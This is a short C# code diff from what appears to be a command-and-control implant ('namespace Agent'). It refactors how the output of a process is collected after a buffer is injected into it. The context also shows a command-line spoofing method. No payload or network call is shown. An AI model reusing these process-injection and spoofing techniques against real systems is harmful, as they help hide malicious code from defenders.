@@ -65,18 +65,16 @@ namespace Agent
             technique.Inject(buf, pInfo.hProcess);
 
             SafeFileHandle safeStdOutRead = new SafeFileHandle(hStdOutRead, true);
-            if (args.output && !safeStdOutRead.IsInvalid)
-            {
-                Task.Run(() =>
-                {
-                    GetProcessOutput(safeStdOutRead.DangerousGetHandle(), pInfo, job.task.id);
-                    CleanUp(hStdOutRead, hStdOutWrite, pInfo);
-                });
-            }
-            else
+
+            if (!args.output)
             {
                 CleanUp(hStdOutRead, hStdOutWrite, pInfo);
+                return;
             }
+
+
+            GetProcessOutput(safeStdOutRead.DangerousGetHandle(), pInfo, job.task.id);
+            CleanUp(hStdOutRead, hStdOutWrite, pInfo);
 
         }
         public Native.NTSTATUS TrySpoofCommandLine(string spoofedCmdLine, Native.PROCESS_INFORMATION PROCESS_INFORMATION_instance)
